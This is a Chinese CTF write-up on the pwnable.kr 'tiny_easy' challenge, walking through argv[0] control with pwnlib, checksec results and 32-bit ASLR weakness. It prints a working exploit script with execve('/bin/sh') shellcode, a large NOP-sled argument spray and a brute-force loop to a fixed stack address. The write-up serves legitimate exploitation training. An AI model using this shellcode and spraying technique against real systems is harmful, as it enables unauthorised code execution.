前几天在国外的某个ctf社区发现了一道好玩的赛题。

建议ctfer在阅读这篇文章的时候，首先要掌握以下的一些内容，因为这些东西对于ctf比赛来说，都是很有必要掌握的。

  * 基本的Linux知识

  * 对于X86有基本的了解

  * 了解堆栈工作原理

  * C语言的基本知识

  * 了解缓冲区溢出漏洞的原理

  * 基本的python开发能力

本文涉及知识点实操练习：[PWN综合练习（一）](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015111814131600001&pk_campaign=freebuf-wemedia)（CTF PWN进阶训练实战，尝试溢出一个URL解码程序。）

#### 计算机字节和shell的魅力

我第一次接触到网络安全编程时，我就已经发现开发其实是一门艺术，并且研究员需要很高的水平才能胜任这一工作，因为很多时候你需要各种领域的知识进行结合。例如。C语言、汇编、堆栈、利用python进行漏洞开发利用等，当然，这些只是冰山一角。

对于一个刚进入漏洞利用开发领域的小白来说，这可能是很难的，因为这是一个从零开始进行积累的过程。

作为一名小菜鸡，我决定先挑战这个网站的最简单的pwn赛题。别问为什么，问就是别的试题太难了。

![headImg.action?news=8905d78d-fca8-4a5b-8ddb-a23ff6c864d4.png](https://image.3001.net/images/20210303/1614758152_603f410867307d4c61aa1.png!small)

#### 进入正题

让我们先进入SSH！

    
    
    ssh [tiny_easy@pwnable.kr](mailto:tiny_easy@pwnable.kr) -p2222

（对于Windows用户，我强烈推荐使用xshell，它是一款很好上手的软件，可用于处理ssh会话并轻松下载软件）

在ssh内，我们运行“ ls”命令，仅找到一个二进制文件和我们的flag文件，由于我们没有任何权限，因此无法进行读取。

![headImg.action?news=223a76af-78b2-4640-9b48-bf267c6aacb9.png](https://image.3001.net/images/20210303/1614758153_603f410998394116b41cc.png!small)

我们先下载二进制文件并对其进行一些检查：先使用“
file”命令进行查看。该命令可以让我们查看二进制文件的详细信息，包括其体系结构，位数（x64与x32）和其他很多的细节。

![headImg.action?news=b6490add-8ad2-4002-830b-17315a7d69cd.png](https://image.3001.net/images/20210303/1614758158_603f410e40020b69efe12.png!small)

从输出的内容中我们可以看到，该文件是x86体系结构的32位ELF文件，并且是静态链接的。

可是等等… 注意这个细节！

![headImg.action?news=943c7b6f-054b-4c05-9919-10e1c3cad302.png](https://image.3001.net/images/20210303/1614758158_603f410ec9ae64653913a.png!small)

让我们运行这个二进制文件，看看会发生什么情况：

![headImg.action?news=767c71c6-067a-491a-99f4-82c11ef43b65.png](https://image.3001.net/images/20210303/1614758159_603f410f8f1822b8480f3.png!small)

从二进制文件具有损坏的header并且在执行时崩溃的情况可以看出，我们猜测现在这个二进制文件可能与通常我们看到的文件有所不同。

让我们在ida中打开二进制文件并检查代码

![headImg.action?news=56a40ad5-915f-4eee-9b37-6ab4dafe80a0.png](https://image.3001.net/images/20210303/1614758160_603f41102ca6655f2308a.png!small)

这可能是我见过的最简短的文件了，整个程序只有4条指令。

我们从栈中执行两个pop指令，从edx指向的地方取值，然后跳转到它。

但是等等......这个程序中没有进行任何调用，那么哪些值是从栈中弹出的呢？

我们还是用gdb来检查一下吧!

![headImg.action?news=a3e1505a-ea5e-4c90-8057-27ade13d4c45.png](https://image.3001.net/images/20210303/1614758160_603f4110c42c40a3affba.png!small)

看一下堆栈，我们看到eax将接收值1，而edx将接收指向该字符串的指针

“/home/user/CTFs/Pwnables/tiny_easy/tiny_easy”，这就是我们的二进制文件的路径！

如果继续执行直到调用edx，我们就会明白为什么我们之前会收到段错误的原因了。

![headImg.action?news=e66faf62-37e2-446a-8944-1ef5643a3e63.png](https://image.3001.net/images/20210303/1614758161_603f41118a51dd455385a.png!small)

这个程序会试图跳转到地址0x6d6f682f，这对应字符串"/hom "的值。它是我们的二进制文件路径的一部分。

我们继续运行我们的程序，参数分别为test1 test2 test3。我们可以通过在gdb中运行以下命令来达到这一目的。

    
    
    run test1 test2 test3 

![headImg.action?news=c31fdfa9-63ce-43b7-afbd-12d60a405dac.png](https://image.3001.net/images/20210303/1614758162_603f41122ef602e707203.png!small)

我们可以看到，现在堆栈已经发生了变化，现在我们的堆栈中有参数，并且堆栈顶部的值已从0x1更改为0x4。

还记得大一学的C语言中，main函数是如何接收输入的吗？

    
    
    Int main(int argc, char * argv [], char * envp)

main中的argv [0]始终指向当前二进制文件的路径，argv [1] argv [2]等将包含我们输入的参数。

为了能够成功跳转到所需的位置，我们需要控制argv [0]的值。如果它不是我们输入的参数，我们该如何控制argv [0]呢？

下面隆重介绍一个在神奇的库文件 -- pwnlib，Pwnlib是一个python库，它使我们能够轻松的和进程进行通信。

pwnlib.tubes.process允许我们创建自己的进程并控制它的不同参数（argv，envp）等等。

我编译了以下的代码片段来展示pwnlib的简单使用方式：

    
    
    int main(int argc, char * argv[])  
    ​  
    {  
    ​  
    ​  
      printf("\nthis is our argv[0] %s\n", argv[0]);  
    ​  
    }

当我编译运行它的时候，得到了以下的结果。

![headImg.action?news=bf5e765b-cc1e-4135-be81-3adafe8b135d.png](https://image.3001.net/images/20210303/1614758162_603f4112c05e81487cf0f.png!small)

我们可以使用pwnlib将argv [0]修改为我们自己的字符串，

    
    
    from pwnlib.tubes.process import *   
    ​  
    argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")  
    ​  
    print argv_program.recv()

现在，运行我们的python程序，看看我们从test_argv程序中能得到什么结果：

![headImg.action?news=3bf9a2a8-44ab-40c5-9028-434f97714cbd.png](https://image.3001.net/images/20210303/1614758163_603f41134b36668356c25.png!small)

NICE !

现在，我们知道如何控制argv0参数了，这意味着我们可以在tiny_easy二进制文件中的任意位置进行跳转。

下一步是检查此二进制文件的安全属性，让我们运行checksec命令看看效果：

![headImg.action?news=e74735ce-bee2-483f-936b-1fd86f68ef3f.png](https://image.3001.net/images/20210303/1614758163_603f4113e3ba6304c2f1d.png!small)

 **RELRO** ：这里没有RELRO保护；

 **堆栈** ：未发现堆栈canary机制；

 **NX：** NX已禁用；

PIE： 无 PIE；

 **注意** ：默认情况下，ASLR在堆栈中是启用状态。

NX保护是一种保护机制，它不允许我们在二进制的代码部分运行代码，这意味着我们不能跳转到栈或堆上的代码来运行它们。

在这个例子中，我们可以看到这个二进制文件是在没有保护的情况下进行编译的，这意味着我们可以跳转到堆上的代码。

这里需要强调一点的是：你如果一开始就直接检查这类保护，整个过程会给你节省很多时间。

在这个例子中，因为我们无法控制返回的地址，而且NX被禁用，那么我们最好的选择就是集中精力找到一种方法跳转到栈上，并执行我们存储在某个参数中的shellcode。

同时，另一方面，如果NX被启用了，那么这意味着我们无法跳转到堆栈，我们需要找到一种不同的方式来运行我们的代码（ret2libc等许多其他方法）。

现在我们可以控制我们要跳转的位置了，同时我们需要处理ASLR在堆栈层已经被启用这个问题。

我们可以尝试找一条允许我们跳转到堆栈的指令，然后运行我们的shellcode，程序中的其余字节是elf头的一部分。

![headImg.action?news=34e2e449-42c7-4131-9837-5e190d1e9b1e.png](https://image.3001.net/images/20210303/1614758164_603f41149ae44188ef17f.png!small)

我们也可以使用“ C”快捷键在IDA中查看这些字节的指令。

![headImg.action?news=7f200a00-5343-4e5a-b2ef-ffbdb06ba546.png](https://image.3001.net/images/20210303/1614758165_603f411597da7a846d5e2.png!small)

看来我们最好使用的指令是 "jmp esp"。这个指令将会跳转到堆栈，在那里我们能够得到我们存储在参数中的shellcode。

我喜欢手动进行搜索，所以我用online disassembling 来查找jmp esp指令由哪些操作码组成。

如果我们尝试反汇编jmp esp，那么得到的结果是：ff e4

我们尝试使用search-> bytesequence在IDA中搜索此字节。

 **what?** 没结果？

![headImg.action?news=71c85bb5-c44e-4d3b-b378-d674a7e8f76e.png](https://image.3001.net/images/20210303/1614758166_603f41167656146596250.png!small)

我试着搜索调用esp的字节，却什么也没找到 ！

这就郁闷了！

我们想跳转到堆栈上的代码，但是由于ASLR的存在，我们不知道要跳转到什么地址。

我们尝试找到一个指令，让我们在不知道地址的情况下跳转到堆栈，但我们没有找到任何指令。

我尝试了另一个骚操作：跳转到一个允许你向代码部分写入字节的指令。

你可以尝试用这个方法：用jmp esp操作码覆盖其中的一条指令的地址，然后跳转到该指令的地址。

这个过程就像开火车一样，边开边建轨道。

不幸的是，当我用view->Open subviews->segments看看有哪些段的权限的时候，发现了以下的内容。

![headImg.action?news=d3400588-5611-42e5-b002-9615160b8ca7.png](https://image.3001.net/images/20210303/1614758167_603f41170b4ece0bd1ac8.png!small)

代码部分仅启用了R和X权限

R-读取权限

X-执行权限

W（写）权限被禁用。

这意味着，如果我们重写代码部分的指令，程序就会崩溃。

我在这个程序上已经用了好几个小时了，尝试了不同的跳转指令的方法，但是我找不到进入栈的方法。

然后，what should I do?

#### 32位的ASLR

我开始尝试查阅32位系统上的ASLR的实现原理（特别强调，我们的二进制文件是32位的）。我找到了下面的解释：

"对于32位，有2^32 (4 294 967 296)个地址，然而，内核只允许一半的比特位(2^(32/2)=65 536)在虚拟内存中执行"。

这意味着堆栈的大小可以调整到65,536个字节。

如果我们可以控制数万个shellcode字节，那么我们就可以尝试在堆栈中跳转到一个固定的地址，这样就会有很高的成功率。

下面我检查了一下是否可以用长字符串发送大量的参数。

    
    
    from pwnlib.tubes.process import *  
    ​  
    for i in range(600):  
      argv.append("a"*1024)  
    ​  
    argv_program=process(argv=["awdawd"], executable="/home/user/test_argv")  
    ​  
    print argv_program.recv()

![headImg.action?news=9564e876-be61-46ab-b8be-535f7a6e34b8.png](https://image.3001.net/images/20210303/1614758167_603f41178964b861b08ab.png!small)

在本例中，我们向程序发送了6014400个字节并成功运行。

我们可以传递我们的参数来填满nops，最后发送我们的shellcode。

这样，我们就可以跳转到堆栈上的一个随机地址，希望能够落在我们的nop指令上，然后我们就会一路滑向我们的shellcode。

我写了以下的代码，尝试执行程序。

我们在这里尝试跳转到堆栈上的一个恒定地址：0xffb05544，选择这个地址有两个原因。

1.在这个程序中，我注意到在用gdb执行了很多次之后，这个地址大部分时间都在堆栈的范围内或者非常接近堆栈的范围 。

2.我们需要一个没有任何null字节的地址，否则我们会得到

一个异常："Inappropriate nulls in argv[0]:"

所以我写了以下代码：

    
    
    import struct  
    import random  
    from pwnlib.tubes.process import *  
    from pwnlib.exception import *  
    import pwnlib  
    ​  
    EXECV = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"  
    ​  
    def build_shellcode(address):  
    ​  
      """  
      Build shellcode  
      address - address to jump to  
      """   
    ​  
      args = []  
      args.append(address)  
      shellcode =   "\x90"*8000 + EXECV  
      for i in range(120):  
          args.append(shellcode)  
      return args  
    ​  
    if __name__ == "__main__":  
      jump_address = struct.pack("I", 0xffb05544)  
      for i in range(10000000):  
          try:  
              prog_args = build_shellcode(jump_address)  
                  print "attempt number: {}".format(i + 1 )  
              pro = process(argv=prog_args,  
                  env={},      
                            executable="/home/user/CTFs/Pwnables/tiny_easy/tiny_easy")  
              print "started_running address {}".format(hex(struct.unpack("I",jump_address)[0]))  
              pro.timeout=0.08  
    ​  
              # Send command shell of the process  
              pro.sendline("echo we_made_it!")  
    ​  
              # Recv the result of the command execution    
              data = pro.recvline()  
    ​  
    ​  
              if data:  
                  print "received data!"  
                  print data  
                  break  
          except (EOFError, pwnlib.exception.PwnlibException) as e:  
              print e

这段代码会运行tiny_easy二进制文件并跳转到我们的shellcode，从而打开一个shell。如果我们成功了，那么我们将能够发送命令"echo
we_made_it"，看看它的输出。

说干就干！

![headImg.action?news=62a6220e-bc16-47a7-ad3a-071127b40778.png](https://image.3001.net/images/20210303/1614758168_603f411824d3f0773aca1.png!small)

成功了！现在我们来CTF服务器上检查一下。

请注意，我们需要将我们执行的命令从"echo we_made_it "改为 "cat /home/tiny_easy/flag "，这样就得到了flag。

我们可以使用 "scp "命令轻松地将我们的脚本上传到服务器的tmp目录下，就像这样。

    
    
    scp -P 2222 ./pwn_tiny.py tiny_easy@pwnable.kr:/tmp/pwn_tiny.py

![headImg.action?news=65f8f26b-192e-401b-8126-fa366d9383eb.png](https://image.3001.net/images/20210303/1614758168_603f4118dd900c9068544.png!small)

终于拿到了我们的flag !

#### 总结

行文至此，本次测试也就结束了！文章略长，简单做个总结：

在本文中，我们通过使用CTF示例讨论了漏洞利用开发的过程，我们了解了程序如何从argv和argc接收输入的参数。最后，了解了由于较小的随机范围，32位系统中的ASLR为何容易受到攻击，以及如何利用此漏洞进行攻击。

